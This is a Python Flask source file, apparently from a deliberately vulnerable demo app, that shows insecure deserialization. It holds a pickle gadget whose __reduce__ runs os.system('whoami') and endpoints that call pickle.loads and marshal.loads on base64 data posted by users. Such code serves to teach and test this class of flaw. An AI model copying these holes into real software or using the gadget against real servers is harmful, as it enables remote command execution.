import pickle,os
from flask import request
from demo.common import SerializerJsonResponse
import base64
import os
import marshal


class A(object):
    def __init__(self):
        self.code = "ls"

    def __reduce__(self):
        return (os.system,('whoami',))


def makePickleData():
    ser = request.form
    if ser:
        code = ser['code']
    else:
        return SerializerJsonResponse(None, 202, "params error")
    a = A()
    a.code = code
    p = pickle.dumps(a)
    a = base64.b64encode(p)

    return SerializerJsonResponse(a.decode('utf-8'))


# pickle 序列化
def getPickleData():
    ser = request.form
    if ser:
        code = ser['code']
    else:
        return SerializerJsonResponse(None, 202, "params error")

    origin_data = base64.b64decode(code)
    d = pickle.loads(origin_data)

    return SerializerJsonResponse(d)


# marshal
def vulCode(code="whoami"):
    import os
    os.system(code)


def makeMarshalData():
    ser = request.form
    if ser:
        code = ser['code']
    else:
        code = "None"
    code_serialized = marshal.dumps(vulCode)
    # print(code_serialized)
    # print(type(code_serialized))
    base_serialized = base64.b64encode(code_serialized)

    return SerializerJsonResponse(base_serialized.decode('utf-8'))


def getMarshalData():
    ser = request.form
    if ser:
        code = ser['code']
    else:
        return SerializerJsonResponse(None, 202, "params error")

    origin_data = base64.b64decode(code)
    d = marshal.loads(origin_data)
    print(d)
    return SerializerJsonResponse(d)